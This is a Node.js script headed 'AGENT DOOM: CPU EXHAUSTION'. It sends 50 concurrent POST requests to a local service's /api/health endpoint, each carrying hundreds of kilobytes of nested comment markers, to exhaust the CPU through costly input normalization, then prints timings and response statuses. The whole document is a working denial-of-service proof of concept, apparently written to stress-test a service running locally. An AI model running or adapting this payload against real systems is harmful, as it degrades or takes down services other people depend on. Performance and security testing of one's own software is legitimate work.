const http = require('http');

const TARGET = { host: 'localhost', port: 8081 };

async function dose() {
    console.log("==========================================");
    console.log("🔥 AGENT DOOM: CPU EXHAUSTION 🔥");
    console.log("==========================================");

    const massivePayload = "/*".repeat(100000) + "*/".repeat(100000); // 400KB of comment markers
    const body = JSON.stringify({
        data: "A".repeat(100000), // 100KB benign
        poison: massivePayload
    });

    console.log(`[*] Sending payloads to trigger normalization overhead...`);
    
    const start = Date.now();
    const tasks = [];
    for(let i=0; i<50; i++) {
        tasks.push(new Promise((resolve) => {
            const req = http.request({
                ...TARGET, path: '/api/health', method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            }, (res) => {
                res.on('data', () => {});
                res.on('end', () => resolve(res.statusCode));
            });
            req.on('error', () => resolve('FAILED'));
            req.write(body);
            req.end();
        }));
    }

    const results = await Promise.all(tasks);
    const duration = Date.now() - start;

    console.log(`[!] Completed 50 heavy requests in ${duration}ms`);
    console.log(`[!] Avg Time: ${duration / 50}ms`);
    console.log(`[!] Statuses: ${[...new Set(results)].join(', ')}`);
}

dose().catch(console.error);
